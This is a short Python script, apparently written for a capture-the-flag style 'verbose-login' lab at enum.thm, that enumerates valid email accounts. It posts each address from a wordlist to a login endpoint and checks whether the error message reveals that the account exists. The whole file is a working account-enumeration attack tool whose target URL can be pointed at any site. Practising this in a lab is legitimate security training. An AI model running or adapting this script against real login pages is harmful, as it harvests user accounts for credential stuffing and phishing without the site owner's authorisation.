#!/usr/bin/env python3
# script.py — basic email enumerator for verbose-login lab
import requests
import sys

def check_email(session, url, email):
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',
        'function': 'login'
    }
    try:
        r = session.post(url, headers=headers, data=data, timeout=10)
        return r.json()
    except Exception as e:
        print(f"[!] Request failed for {email}: {e}")
        return None

def enumerate_emails(email_file, url):
    valid_emails = []
    invalid_error = "Email does not exist"

    session = requests.Session()
    with open(email_file, 'r') as f:
        for line in f:
            email = line.strip()
            if not email:
                continue
            resp = check_email(session, url, email)
            if not resp:
                continue
            if resp.get('status') == 'error' and invalid_error in resp.get('message', ''):
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)
    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <email_list_file> <target_url>")
        print("Example: python3 script.py usernames_gmail.com.txt 'http://enum.thm/labs/verbose_login/functions.php'")
        sys.exit(1)

    email_file = sys.argv[1]
    target_url = sys.argv[2]
    found = enumerate_emails(email_file, target_url)
    print("\nValid emails found:")
    for e in found:
        print(e)

